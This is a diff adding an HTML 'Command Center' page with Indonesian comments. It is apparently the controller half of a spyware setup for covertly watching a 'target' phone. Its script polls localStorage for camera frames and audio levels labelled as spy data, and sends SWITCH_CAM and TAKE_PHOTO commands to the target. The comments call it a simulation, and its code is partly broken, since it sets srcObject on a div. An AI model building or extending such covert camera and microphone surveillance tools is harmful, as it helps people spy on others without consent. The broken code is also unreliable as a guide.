@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Command Center</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; margin: 0; display: flex; flex-direction: column; align-items: center; }
+        h2 { margin-top: 10px; }
+        #video-feed { width: 100%; max-width: 400px; border: 2px solid #0f0; background: #111; }
+        .controls { margin-top: 20px; display: flex; gap: 10px; }
+        .btn { padding: 10px 20px; background: #004400; color: #0f0; border: 1px solid #0f0; cursor: pointer; }
+        .btn:active { background: #0f0; color: #000; }
+        #audio-viz { width: 300px; height: 50px; background: #001100; border: 1px solid #0f0; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <h2>👁️ TARGET CONNECTION</h2>
+    <div id="video-feed">Menunggu Sinyal Video...</div>
+    <canvas id="audio-viz"></canvas>
+    
+    <div class="controls">
+        <button class="btn" onclick="switchCam()">🔄 Ganti Kamera</button>
+        <button class="btn" onclick="takePhoto()">📸 Foto</button>
+    </div>
+
+    <script>
+        // 1. SETUP KAMERA & MIKROFON LOKAL (SIMULASI)
+        // Karena browser tidak mengizinkan stream video lintas tab tanpa WebRTC Server,
+        // Controller ini akan merekam simulasi atau menggunakan Camera HP Kamu sendiri sebagai demo.
+        
+        async function startMyCam() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                document.getElementById('video-feed').srcObject = stream;
+            } catch(e) { console.log("Akses kamera ditolak"); }
+        }
+        startMyCam();
+
+        // 2. PANTAU DATA DARI TARGET
+        // Kita akan membaca data Base64 (Gambar) yang dikirim HP Target
+        setInterval(() => {
+            const imgData = localStorage.getItem('spy_cam_frame');
+            const audioData = localStorage.getItem('spy_audio_level');
+            
+            if(imgData) {
+                const img = new Image();
+                img.src = imgData;
+                const container = document.getElementById('video-feed');
+                // Bersihkan container dulu
+                container.innerHTML = '';
+                container.appendChild(img);
+            }
+
+            if(audioData) {
+                const ctx = document.getElementById('audio-viz').getContext('2d');
+                const level = parseInt(audioData);
+                ctx.fillStyle = '#0f0';
+                ctx.fillRect(10, 50 - level, 280, level);
+            }
+
+        }, 100); // Update tiap 100ms
+
+        // 3. KIRIM PERINTAH KE TARGET
+        function sendCmd(cmd) {
+            localStorage.setItem('spy_command', cmd);
+        }
+
+        function switchCam() { sendCmd('SWITCH_CAM'); }
+        function takePhoto() { sendCmd('TAKE_PHOTO'); }
+
+    </script>
+</body>
+</html>
